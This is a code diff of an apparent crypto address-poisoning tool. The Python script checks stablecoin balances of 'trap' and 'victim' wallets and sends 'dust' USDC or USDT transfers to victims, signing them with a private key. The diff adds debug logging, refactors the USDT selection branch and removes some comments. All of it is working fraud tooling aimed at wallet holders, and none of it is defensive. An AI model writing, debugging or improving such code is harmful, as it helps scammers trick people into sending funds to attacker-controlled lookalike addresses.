@@ -269,11 +269,14 @@ def call_with_retry(func, *args, max_attempts=3, base_delay=1, **kwargs):
 
 def get_token_balance(address, token_symbol):
     token_addr = TOKEN_CONFIG.get(token_symbol)
+    print(f"[DEBUG] get_token_balance: symbol={token_symbol}, config_addr={token_addr}")
     if not token_addr:
         return 0
     token = w3.eth.contract(address=w3.to_checksum_address(token_addr), abi=ERC20_ABI)
     try:
-        return call_with_retry(token.functions.balanceOf, address).call()
+        balance = call_with_retry(token.functions.balanceOf, address).call()
+        print(f"[DEBUG] get_token_balance: {address} has {balance} of {token_symbol}")
+        return balance
     except Exception as e:
         logger.warning(f"Failed to get token balance for {address}: {e}")
         return 0
@@ -289,17 +292,32 @@ def choose_asset(victim, trap):
     
     force_stable = os.getenv("FORCE_STABLECOIN_DUST", "").lower() == "true"
 
+    print(f"\n[DEBUG] === BALANCE CHECK ===")
+    print(f"[DEBUG] Trap USDC: {trap_usdc} | Victim USDC: {victim_usdc}")
+    print(f"[DEBUG] Trap USDT: {trap_usdt} | Victim USDT: {victim_usdt}")
+    print(f"[DEBUG] DUST_AMOUNT config: {DUST_AMOUNT}")
+    print(f"[DEBUG] FORCE_STABLECOIN_DUST: {force_stable}")
+
     if "USDC" in DUST_AMOUNT:
         dust_amount = DUST_AMOUNT["USDC"]
         if trap_usdc_native >= dust_amount and (victim_usdc_native > 0 or force_stable):
+            print("[DEBUG] ✅ Selected USDC_NATIVE")
             return ("USDC_NATIVE", dust_amount)
         if trap_usdc >= dust_amount and (victim_usdc > 0 or force_stable):
+            print("[DEBUG] ✅ Selected USDC")
             return ("USDC", dust_amount)
+        else:
+            print("[DEBUG] ❌ USDC skipped: Trap balance too low OR Victim balance is 0 (and force_stable is false)")
 
-    if "USDT" in DUST_AMOUNT and trap_usdt >= DUST_AMOUNT["USDT"] and (victim_usdt > 0 or force_stable):
-        return ("USDT", DUST_AMOUNT["USDT"])
+    if "USDT" in DUST_AMOUNT:
+        dust_amount = DUST_AMOUNT["USDT"]
+        if trap_usdt >= dust_amount and (victim_usdt > 0 or force_stable):
+            print("[DEBUG] ✅ Selected USDT")
+            return ("USDT", dust_amount)
+        else:
+            print("[DEBUG] ❌ USDT skipped: Trap balance too low OR Victim balance is 0 (and force_stable is false)")
 
-    print('[DEBUG] No suitable stablecoin found in trap, or victim does not hold stablecoins. Skipping dust.')
+    print('[DEBUG] 🛑 No suitable stablecoin found in trap, or victim does not hold stablecoins. Skipping dust.')
     return (None, 0)
 
 _last_low_balance_alert = {}
@@ -347,7 +365,6 @@ def send_dust(private_key, victim_address, campaign_id=None):
             calculated_max = int((base_fee * fee_buffer) + max_priority)
             max_fee = min(calculated_max, max_fee_cap)
 
-            # Invariant: EVM requires maxFeePerGas >= maxPriorityFeePerGas
             if max_fee < max_priority:
                 max_fee = max_priority
 
@@ -385,7 +402,7 @@ def send_dust(private_key, victim_address, campaign_id=None):
         # --- SAFE & OPTIMIZED GAS ESTIMATION ---
         try:
             estimated = call_with_retry(token.functions.transfer(victim, dust).estimate_gas, {'from': trap})
-            gas_limit = int(estimated * 1.05)  # Tight 5% safety buffer like batch_fund.py
+            gas_limit = int(estimated * 1.05)
         except Exception as e:
             logger.warning(f"Gas estimation failed: {e}, using fallback 68000")
             gas_limit = 68000
@@ -425,8 +442,6 @@ def send_dust(private_key, victim_address, campaign_id=None):
             return False
 
         signed = w3.eth.account.sign_transaction(tx, private_key)
-        
-        # ─── FIX: Cross-version raw transaction byte extraction ───
         raw_tx = getattr(signed, 'raw_transaction', getattr(signed, 'rawTransaction', None))
         
         try:
